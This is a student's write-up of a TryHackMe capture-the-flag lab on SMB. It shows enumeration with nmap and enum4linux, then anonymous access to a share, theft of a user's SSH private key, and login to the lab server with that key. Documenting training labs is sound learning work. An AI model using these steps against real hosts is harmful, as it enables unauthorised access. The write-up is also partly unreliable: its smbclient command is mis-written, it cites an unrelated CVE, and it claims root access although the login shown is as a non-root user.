# Documentation: TryHackMe Exploiting SMB #01

## 1. Introduction
- **Purpose**: Document my experience and share knowledge on the Cyber Defense challenges
- **Scope**:  Learn the fundamental components of detecting and responding to threats in a corporate environment

## 2. Setup
- **Environment**: Kali Linux via VirtualBox
- **Accounts and Access**: Created a TryHackMe account and accessed the room via OpenVPN

## 3. Challenge Walkthrough

### 3.1 Room Name: Network Services
- **Objective**: Access a server and capture the flag by enumerating an SMB and exploiting its vulnerabilities to exfiltrate sensitive data and gain access to the server and capture the flag

### 3.2 Enumeration
- **Initial Scanning**:
  - **Tools and Commands**:
    - Port Scanning:
    	- `nmap -Pn 10.10.242.131`
    - SMB Enumeration: 
		- `enum4linux -U 10.10.242.131`
		- `enum4linux -a 10.10.242.131`
  - **Findings**:
	- Users are: administrator, guest, krbtgt, domain admins, root, bin, none
	- No password 
	- Workgroup name is WORKGROUP
	- Name of machine is polosmb
	- OS running on version 6.1
	- ***Ports that are open***:
		- 22/tcp  open  ssh
		- 139/tcp open  netbios-ssn
		- 445/tcp open  microsoft-ds
	- Users profiles is shared in the SMB with the sharename 'profiles'

### 3.3 Exploitation
- **Vulnerability Identification**: [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
  - **Techniques Used**:  exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

- **Exploitation Process**:
	- Enter to access SMB `smbclient //10.10.242.131/ Anonymous -U profiles`
	- Press enter on the password because there is no password set
	- Enter `ls -a` to show files and hidden files
![Screenshot 2024-05-20 183213](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/ef9f7522-8502-429f-bc32-cad423820baa)

	- Type `get Working From Home Information` to download to your download folder
![Screenshot 2024-05-20 182845](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/1d7c5b9c-018a-4ab7-959a-64dbbc710cea)

	- Enter `cat Working From Home Information.txt` in the terminal to view the text file
![Screenshot 2024-05-20 184207](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/417d6c7f-e9c6-491a-80bc-dbd43424dc9b)

	- Type `open .ssh` to access directory
![Screenshot 2024-05-20 183844](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/a871111d-92af-4503-8973-c949870cfb41)

	- To download type `get id_rsa`
![Screenshot 2024-05-20 183844](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/ba82f020-cde0-452d-948c-5f08794d993d)

	- Type `chmod 600` id_rsa to change the permissions
![chmod](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/c0217817-5203-46c4-9743-66995a57566a)

	- Type `ssh cactus@10.10.242.131 -i id_rsa` to access the server
![Screenshot 2024-05-20 190916](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/b61b84c7-f850-4c50-b0bd-147bcbfecbfd)

	- Type `ls`  to show files then `cat smb.txt` to view text file
![Screenshot 2024-05-20 191157](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/145c3e10-0603-4e3e-a297-f55fee5498ee)


## 4. Analysis and Reflection
- **Challenges Faced**: Difficulty comprehending instructions and which commands to use
- **Learnings**: Importance of thorough enumeration.
- **Improvements**: Try alternative enumeration techniques earlier.

## 5. Conclusion
- **Summary**: Successfully gained root access and captured the flag

## 6. References
- [TryHackMe](https://tryhackme.com)
- [Nmap Documentation](https://nmap.org/book/man.html)

